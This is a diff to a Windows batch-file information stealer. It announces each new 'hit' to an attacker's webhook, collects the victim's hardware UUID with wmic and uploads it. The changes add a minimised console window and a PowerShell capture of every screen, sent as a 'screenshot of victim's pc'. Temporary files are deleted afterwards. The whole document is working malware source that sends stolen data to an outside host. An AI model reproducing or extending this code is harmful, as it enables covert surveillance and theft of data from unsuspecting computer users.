@@ -1,5 +1,7 @@
 @echo off
-set webhook=*your webhook here*
+mode con: cols=15 lines=10
+set "tempfile=%~dp0screenshot.png"
+set webhook=*ur webhook here*
 curl -X POST -d "content=||@here||||@everyone||" %webhook%
 curl -X POST -d "content=NEW HIT!!!!" %webhook%
 
@@ -26,11 +28,10 @@ del pcname.txt
 curl -X POST -d "content= uuid(hwid):" %webhook%
 wmic csproduct get uuid>hwid.txt 
 curl --silent --output /dev/null -F l=@"hwid.txt" %webhook%
+del hwid.txt 
 
-del hwid.txt 
-del pcname.txt 
-del hwid.txt 
-del pcusername.txt 
-del cpuid.txt 
-del database.txt
-del ip.txt
+
+powershell -command "& { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $bounds = $_.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bitmap.Save('%tempfile%', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose() }}"
+curl -X POST -d "content= screenshot of victim's pc" %webhook%
+curl --silent --output /dev/null -F l=@"screenshot.png" %webhook%
+del screenshot.png
